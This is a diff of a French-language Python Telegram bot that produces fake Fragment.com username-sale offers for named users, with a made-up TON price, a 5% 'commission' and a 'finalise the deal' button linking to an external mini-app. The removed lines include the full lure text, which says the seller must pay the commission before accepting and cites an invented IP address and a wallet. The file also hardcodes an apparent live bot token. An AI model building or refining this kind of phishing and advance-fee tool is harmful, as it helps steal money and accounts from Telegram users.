@@ -1,357 +1,332 @@
-import os
 import logging
-from telegram.ext import Application, CommandHandler
+import os
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application, 
+    CommandHandler, 
+    MessageHandler, 
+    filters, 
+    ContextTypes, 
+    ConversationHandler,
+    CallbackQueryHandler
+)
 
-# Configuration avec fallback
+# Configuration du logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# États de conversation
+USERNAME_INPUT, PRICE_INPUT, CONFIRMATION = range(3)
+
+# Configuration
 BOT_TOKEN = os.getenv('BOT_TOKEN', '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c')
-WEBAPP_URL = "https://myminiapp.onrender.com/"
+WEBAPP_URL = os.getenv('WEBAPP_URL', 'https://telegram-bot-vic3.onrender.com')
+PORT = int(os.getenv('PORT', 8080))
 
-print(f"🔍 DEBUG: BOT_TOKEN: {BOT_TOKEN[:20]}...")
+print(f"🔍 DEBUG: BOT_TOKEN configuré: {'✅' if BOT_TOKEN else '❌'}")
 print(f"🔍 DEBUG: WEBAPP_URL: {WEBAPP_URL}")
 
-async def start(update, context):
-    await update.message.reply_text('✅ Bot fonctionne parfaitement!')
+# Variables globales pour stocker les données
+user_data = {}
 
-def main():
-    application = Application.builder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
+def format_ton_amount(amount):
+    """Formate un montant en TON avec le symbole 💎"""
+    try:
+        num_amount = float(amount)
+        if num_amount.is_integer():
+            return f"💎{int(num_amount)}"
+        else:
+            return f"💎{num_amount:.2f}"
+    except:
+        return f"💎{amount}"
+
+def extract_amount_from_text(text):
+    """Extrait le montant numérique d'un texte"""
+    import re
     
-    print("🚀 Bot de test démarré!")
-    application.run_polling()
-
-if __name__ == '__main__':
-    main()
-
-
-
-class FragmentDealBot:
-    def __init__(self, token):
-        self.application = Application.builder().token(token).build()
-        self.setup_handlers()
-        
-        # Données temporaires des deals
-        self.user_deals = {}
+    # Supprime les symboles et espaces
+    clean_text = re.sub(r'[💎\$\s,]', '', text)
     
-    def setup_handlers(self):
-        """Configure tous les handlers du bot"""
-        
-        # Conversation handler pour créer un deal
-        conv_handler = ConversationHandler(
-            entry_points=[CommandHandler('newdeal', self.start_deal)],
-            states={
-                USERNAME_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_username)],
-                PRICE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_price)],
-                CONFIRMATION: [CallbackQueryHandler(self.confirm_deal)]
-            },
-            fallbacks=[CommandHandler('cancel', self.cancel_deal)]
-        )
-        
-        self.application.add_handler(conv_handler)
-        self.application.add_handler(CommandHandler("start", self.start_command))
-        self.application.add_handler(CommandHandler("help", self.help_command))
-        self.application.add_handler(CallbackQueryHandler(self.button_callback))
+    # Extrait le nombre
+    match = re.search(r'[\d.]+', clean_text)
+    if match:
+        try:
+            return float(match.group())
+        except ValueError:
+            return None
+    return None
+
+def calculate_commission(price, rate=0.05):
+    """Calcule la commission (défaut: 5%)"""
+    return price * rate
+
+# Gestionnaires de commandes
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Commande /start"""
+    welcome_text = (
+        "🔥 **Fragment Deal Bot**\n\n"
+        "Créez facilement vos messages de deals Fragment.com !\n\n"
+        "💎 **Montants affichés en TON uniquement**\n"
+        "⚡ **Commission calculée automatiquement (5%)**\n"
+        "🎯 **Interface simple et intuitive**\n\n"
+        "**Commandes disponibles :**\n"
+        "• `/newdeal` - Créer un nouveau deal\n"
+        "• `/help` - Aide et instructions\n\n"
+        "✨ Commencez par créer votre premier deal !"
+    )
     
-    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Commande /start"""
-        user = update.effective_user
-        welcome_text = f"""
-🎯 **Fragment Deal Bot**
-
-Bonjour {user.first_name} ! Je suis votre assistant pour générer des messages de deals Fragment.com.
-
-📋 **Commandes disponibles :**
-• `/newdeal` - Créer un nouveau deal
-• `/help` - Aide détaillée
-• `/cancel` - Annuler l'opération en cours
-
-🚀 **Pour commencer :** Tapez `/newdeal`
-        """
-        await update.message.reply_text(welcome_text, parse_mode='Markdown')
-        logger.info(f"Nouvel utilisateur: {user.first_name} (ID: {user.id})")
+    keyboard = [[InlineKeyboardButton("🚀 Créer un deal", callback_data="start_deal")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
-    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Commande /help"""
-        help_text = """
-📚 **Guide d'utilisation Fragment Deal Bot**
+    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
 
-🔹 **Étapes pour créer un deal :**
-1. Tapez `/newdeal`
-2. Saisissez le username Telegram (sans @)
-3. Saisissez le montant en TON
-4. Confirmez et envoyez
-
-💎 **Format du prix :**
-• Saisissez uniquement le nombre
-• Exemple : `1500` pour 💎1500 TON
-
-🔧 **Commandes :**
-• `/newdeal` - Nouveau deal
-• `/cancel` - Annuler
-• `/help` - Cette aide
-
-⚠️ **Notes importantes :**
-• Commission automatique de 5%
-• Tous les montants affichés en TON uniquement
-• URL personnalisable vers votre mini-app
-        """
-        await update.message.reply_text(help_text, parse_mode='Markdown')
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Commande /help"""
+    help_text = (
+        "📖 **Guide d'utilisation**\n\n"
+        "**1️⃣ Créer un deal :**\n"
+        "• Tapez `/newdeal`\n"
+        "• Entrez le nom d'utilisateur\n"
+        "• Entrez le prix (exemple: `1500` ou `1500.50`)\n"
+        "• Confirmez et publiez !\n\n"
+        "**💡 Formats de prix supportés :**\n"
+        "• `1500` → 💎1500\n"
+        "• `1500.50` → 💎1500.50\n"
+        "• `💎2000` → 💎2000\n\n"
+        "**⚙️ Fonctionnalités :**\n"
+        "• Commission automatique (5%)\n"
+        "• Formatage TON automatique\n"
+        "• Bouton d'action personnalisable\n\n"
+        "Besoin d'aide ? Contactez le support !"
+    )
     
-    async def start_deal(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Démarre le processus de création de deal"""
-        user_id = update.effective_user.id
-        self.user_deals[user_id] = {}
-        
+    await update.message.reply_text(help_text, parse_mode='Markdown')
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Gestionnaire des boutons inline"""
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "start_deal":
+        return await start_new_deal_process(query, context)
+
+async def start_new_deal_process(update, context: ContextTypes.DEFAULT_TYPE):
+    """Démarre le processus de création de deal"""
+    user_id = update.from_user.id if hasattr(update, 'from_user') else update.effective_user.id
+    
+    user_data[user_id] = {}
+    
+    text = (
+        "🎯 **Création d'un nouveau deal**\n\n"
+        "Entrez le **nom d'utilisateur** du compte Fragment :\n\n"
+        "📝 Exemple : `@username` ou `username`\n"
+        "💡 Tapez /cancel pour annuler"
+    )
+    
+    if hasattr(update, 'edit_message_text'):
+        await update.edit_message_text(text, parse_mode='Markdown')
+    else:
+        await update.message.reply_text(text, parse_mode='Markdown')
+    
+    return USERNAME_INPUT
+
+async def newdeal(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Commande /newdeal"""
+    return await start_new_deal_process(update, context)
+
+async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Récupère le nom d'utilisateur"""
+    user_id = update.effective_user.id
+    username = update.message.text.strip()
+    
+    # Formatage du nom d'utilisateur
+    if not username.startswith('@'):
+        username = f"@{username}"
+    
+    user_data[user_id]['username'] = username
+    
+    text = (
+        f"✅ **Nom d'utilisateur :** {username}\n\n"
+        "💰 Maintenant, entrez le **prix du deal** :\n\n"
+        "📝 **Exemples :**\n"
+        "• `1500`\n"
+        "• `2000.50`\n"
+        "• `💎3000`\n\n"
+        "💡 Tapez /cancel pour annuler"
+    )
+    
+    await update.message.reply_text(text, parse_mode='Markdown')
+    return PRICE_INPUT
+
+async def get_price(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Récupère le prix"""
+    user_id = update.effective_user.id
+    price_text = update.message.text.strip()
+    
+    # Extraction du montant numérique
+    price_amount = extract_amount_from_text(price_text)
+    
+    if price_amount is None or price_amount <= 0:
         await update.message.reply_text(
-            "📝 **Nouveau Deal Fragment**\n\n"
-            "Étape 1/2: Saisissez le **username Telegram** du client (sans @):\n\n"
-            "Exemple: `CRYPTO_DEAL`\n\n"
-            "_Tapez /cancel pour annuler_",
-            parse_mode='Markdown'
-        )
-        return USERNAME_INPUT
-    
-    async def get_username(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Récupère le username"""
-        user_id = update.effective_user.id
-        username = update.message.text.strip().replace('@', '')
-        
-        # Validation basique du username
-        if not username.replace('_', '').isalnum() or len(username) < 3:
-            await update.message.reply_text(
-                "❌ **Username invalide**\n\n"
-                "Le username doit:\n"
-                "• Contenir au moins 3 caractères\n"
-                "• Contenir uniquement des lettres, chiffres et underscore\n\n"
-                "Réessayez:",
-                parse_mode='Markdown'
-            )
-            return USERNAME_INPUT
-        
-        self.user_deals[user_id]['username'] = username
-        
-        await update.message.reply_text(
-            f"✅ Username: `@{username}`\n\n"
-            "📝 Étape 2/2: Saisissez le **montant en TON**:\n\n"
-            "Exemple: `1500` (sera affiché comme 💎1500)\n\n"
-            "_Tapez /cancel pour annuler_",
-            parse_mode='Markdown'
+            "❌ **Prix invalide !**\n\n"
+            "Veuillez entrer un nombre valide :\n"
+            "• `1500`\n"
+            "• `2000.50`\n"
+            "• `💎3000`"
         )
         return PRICE_INPUT
     
-    async def get_price(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Récupère le prix en TON"""
-        user_id = update.effective_user.id
-        price_input = update.message.text.strip()
-        
-        # Extraction et validation du nombre
-        import re
-        numbers = re.findall(r'[\d.]+', price_input)
-        
-        if not numbers:
-            await update.message.reply_text(
-                "❌ **Prix invalide**\n\n"
-                "Veuillez saisir un nombre valide\n"
-                "Exemple: `1500`\n\n"
-                "Réessayez:",
-                parse_mode='Markdown'
-            )
-            return PRICE_INPUT
-        
-        try:
-            # Conversion en nombre
-            ton_amount = float(numbers[0])
-            
-            # Validation du montant minimum
-            if ton_amount < 1:
-                await update.message.reply_text(
-                    "❌ **Montant trop faible**\n\n"
-                    "Le montant doit être d'au moins 1 TON\n\n"
-                    "Réessayez:",
-                    parse_mode='Markdown'
-                )
-                return PRICE_INPUT
-            
-            # Calcul de la commission (5%)
-            commission_amount = ton_amount * 0.05
-            
-            # Formatage des montants TON
-            # Si c'est un nombre entier, on l'affiche sans décimales
-            if ton_amount == int(ton_amount):
-                deal_price_formatted = f"💎{int(ton_amount)}"
-            else:
-                deal_price_formatted = f"💎{ton_amount:.2f}"
-            
-            if commission_amount == int(commission_amount):
-                commission_formatted = f"💎{int(commission_amount)}"
-            else:
-                commission_formatted = f"💎{commission_amount:.2f}"
-            
-            self.user_deals[user_id].update({
-                'ton_amount': ton_amount,
-                'deal_price': deal_price_formatted,
-                'commission': commission_formatted
-            })
-            
-        except (ValueError, IndexError):
-            await update.message.reply_text(
-                "❌ **Format invalide**\n\n"
-                "Veuillez saisir un nombre valide\n"
-                "Exemple: `1500` ou `1500.5`\n\n"
-                "Réessayez:",
-                parse_mode='Markdown'
-            )
-            return PRICE_INPUT
-        
-        # Aperçu du deal
-        username = self.user_deals[user_id]['username']
-        deal_price = self.user_deals[user_id]['deal_price']
-        commission = self.user_deals[user_id]['commission']
-        
-        preview_text = f"""
-📋 **Aperçu du Deal**
+    # Calcul de la commission
+    commission = calculate_commission(price_amount)
+    
+    # Formatage des montants
+    formatted_price = format_ton_amount(price_amount)
+    formatted_commission = format_ton_amount(commission)
+    
+    # Stockage des données
+    user_data[user_id]['price'] = price_amount
+    user_data[user_id]['formatted_price'] = formatted_price
+    user_data[user_id]['commission'] = commission
+    user_data[user_id]['formatted_commission'] = formatted_commission
+    
+    # Aperçu du message final
+    username = user_data[user_id]['username']
+    preview_text = (
+        "👀 **Aperçu du message :**\n\n"
+        "─────────────────────\n"
+        f"🔥 **FRAGMENT DEAL** 🔥\n\n"
+        f"👤 **Username:** {username}\n"
+        f"💎 **Offer Amount:** {formatted_price}\n"
+        f"💰 **Commission:** {formatted_commission}\n\n"
+        f"📅 **Date:** {datetime.now().strftime('%d/%m/%Y')}\n"
+        f"⏰ **Time:** {datetime.now().strftime('%H:%M')}\n\n"
+        f"🚀 **Status:** Available\n"
+        "─────────────────────\n\n"
+        "✅ **Confirmer et publier ?**"
+    )
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("✅ Publier", callback_data="confirm_deal"),
+            InlineKeyboardButton("❌ Annuler", callback_data="cancel_deal")
+        ],
+        [InlineKeyboardButton("✏️ Modifier", callback_data="edit_deal")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(preview_text, reply_markup=reply_markup)
+    return CONFIRMATION
 
-👤 **Client:** @{username}
-💎 **Montant:** {deal_price}
-💰 **Commission (5%):** {commission}
-
-✅ Confirmer et générer le message ?
-        """
+async def confirm_deal(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Confirme et publie le deal"""
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    
+    if query.data == "confirm_deal":
+        # Récupération des données
+        data = user_data.get(user_id, {})
+        username = data.get('username', '@username')
+        formatted_price = data.get('formatted_price', '💎0')
+        formatted_commission = data.get('formatted_commission', '💎0')
         
-        keyboard = [
-            [
-                InlineKeyboardButton("✅ Confirmer", callback_data='confirm_deal'),
-                InlineKeyboardButton("❌ Annuler", callback_data='cancel_deal')
-            ]
-        ]
+        # Message final
+        final_message = (
+            f"🔥 **FRAGMENT DEAL** 🔥\n\n"
+            f"👤 **Username:** {username}\n"
+            f"💎 **Offer Amount:** {formatted_price}\n"
+            f"💰 **Commission:** {formatted_commission}\n\n"
+            f"📅 **Date:** {datetime.now().strftime('%d/%m/%Y')}\n"
+            f"⏰ **Time:** {datetime.now().strftime('%H:%M')}\n\n"
+            f"🚀 **Status:** Available"
+        )
+        
+        # Bouton d'action
+        keyboard = [[InlineKeyboardButton("💎 Finaliser le deal", url=WEBAPP_URL)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await update.message.reply_text(
-            preview_text.strip(),
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
+        # Publication du message
+        await query.edit_message_text(final_message, reply_markup=reply_markup, parse_mode='Markdown')
+        
+        # Message de confirmation
+        await context.bot.send_message(
+            user_id,
+            "✅ **Deal publié avec succès !**\n\n"
+            "Créer un autre deal ? Tapez `/newdeal`"
         )
-        return CONFIRMATION
-    
-    async def confirm_deal(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Confirme et génère le message final"""
-        query = update.callback_query
-        await query.answer()
         
-        user_id = query.from_user.id
+        # Nettoyage
+        if user_id in user_data:
+            del user_data[user_id]
         
-        if query.data == 'cancel_deal':
-            await query.edit_message_text("❌ Deal annulé.")
-            self.user_deals.pop(user_id, None)
-            return ConversationHandler.END
-        
-        if query.data == 'confirm_deal':
-            deal_data = self.user_deals[user_id]
-            
-            # Génération du message Fragment
-            fragment_message = self.generate_fragment_message(deal_data)
-            
-            # Bouton vers la mini-app
-            deal_link = f"{WEBAPP_URL}/?user={deal_data['username']}&price={deal_data['ton_amount']}"
-            keyboard = [
-                [InlineKeyboardButton("🌐 Ouvrir Mini App", web_app=WebAppInfo(url=deal_link))]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            await query.edit_message_text(
-                "✅ **Deal généré avec succès !**\n\nVoici le message à envoyer:"
-            )
-            
-            # Envoyer le message Fragment
-            await context.bot.send_message(
-                chat_id=user_id,
-                text=fragment_message,
-                reply_markup=reply_markup,
-                parse_mode='Markdown'
-            )
-            
-            # Log du deal créé
-            logger.info(f"Deal créé - User: @{deal_data['username']}, TON: {deal_data['ton_amount']}")
-            
-            self.user_deals.pop(user_id, None)
-            return ConversationHandler.END
-    
-    def generate_fragment_message(self, deal_data):
-        """Génère le message Fragment.com avec montants TON uniquement"""
-        username = deal_data['username']
-        deal_price = deal_data['deal_price']
-        commission = deal_data['commission']
-        
-        message = f"""
-We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
-
-• **Offer Amount:** {deal_price}
-• **Commission:** {commission}
-
-Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
-
-**Additional Information:**
-• Device: Safari on macOS
-• IP Address: 103.56.72.245
-• Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U ([View](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U))
-
-**Important:**
-• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
-• If you choose not to proceed, simply ignore this message.
-        """
-        return message.strip()
-    
-    async def cancel_deal(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Annule le processus de création de deal"""
-        user_id = update.effective_user.id
-        self.user_deals.pop(user_id, None)
-        
-        await update.message.reply_text(
-            "❌ **Opération annulée**\n\n"
-            "Tapez `/newdeal` pour créer un nouveau deal.",
-            parse_mode='Markdown'
-        )
         return ConversationHandler.END
     
-    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Gère les callbacks généraux"""
-        query = update.callback_query
-        await query.answer()
+    elif query.data == "cancel_deal":
+        await query.edit_message_text("❌ Deal annulé. Tapez `/newdeal` pour recommencer.")
+        if user_id in user_data:
+            del user_data[user_id]
+        return ConversationHandler.END
     
-    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Gestion des erreurs"""
-        logger.error(f"Erreur: {context.error}")
-        if update and update.message:
-            await update.message.reply_text(
-                "❌ Une erreur s'est produite. Réessayez avec `/newdeal`"
-            )
-    
-    def run(self):
-        """Lance le bot"""
-        self.application.add_error_handler(self.error_handler)
-        
-        print("🚀 Fragment Deal Bot démarré...")
-        print("🎯 Fonctionnalités:")
-        print("   • Création de deals Fragment")
-        print("   • Calcul automatique des commissions (5%)")
-        print("   • Intégration mini-app")
-        print("\n💬 Tapez /newdeal pour commencer")
-        
-        self.application.run_polling(
-            allowed_updates=Update.ALL_TYPES,
-            drop_pending_updates=True
+    elif query.data == "edit_deal":
+        await query.edit_message_text(
+            "✏️ **Modification du deal**\n\n"
+            "Tapez `/newdeal` pour recommencer la création."
         )
+        if user_id in user_data:
+            del user_data[user_id]
+        return ConversationHandler.END
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Annule la conversation"""
+    user_id = update.effective_user.id
+    if user_id in user_data:
+        del user_data[user_id]
+    
+    await update.message.reply_text(
+        "❌ **Création annulée.**\n\n"
+        "Tapez `/newdeal` pour créer un nouveau deal."
+    )
+    return ConversationHandler.END
 
 def main():
-    if BOT_TOKEN == "7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c":
-        print("❌ ERREUR: Configurez votre BOT_TOKEN !")
-        print("👉 Obtenez votre token via @BotFather")
-        return
-    
+    """Fonction principale"""
     try:
-        bot = FragmentDealBot(BOT_TOKEN)
-        bot.run()
+        # Création de l'application
+        application = Application.builder().token(BOT_TOKEN).build()
+        
+        # Gestionnaire de conversation pour les deals
+        conv_handler = ConversationHandler(
+            entry_points=[
+                CommandHandler('newdeal', newdeal),
+                CallbackQueryHandler(button_callback, pattern='^start_deal$')
+            ],
+            states={
+                USERNAME_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
+                PRICE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_price)],
+                CONFIRMATION: [CallbackQueryHandler(confirm_deal)]
+            },
+            fallbacks=[CommandHandler('cancel', cancel)]
+        )
+        
+        # Ajout des gestionnaires
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("help", help_command))
+        application.add_handler(conv_handler)
+        
+        print("🚀 Fragment Deal Bot démarré...")
+        print("💎 Mode: TON uniquement")
+        
+        # Démarrage du bot
+        application.run_polling()
+        
     except Exception as e:
-        print(f"❌ Erreur fatale: {e}")
+        print(f"❌ Erreur lors du démarrage: {e}")
+        raise
 
 if __name__ == '__main__':
     main()
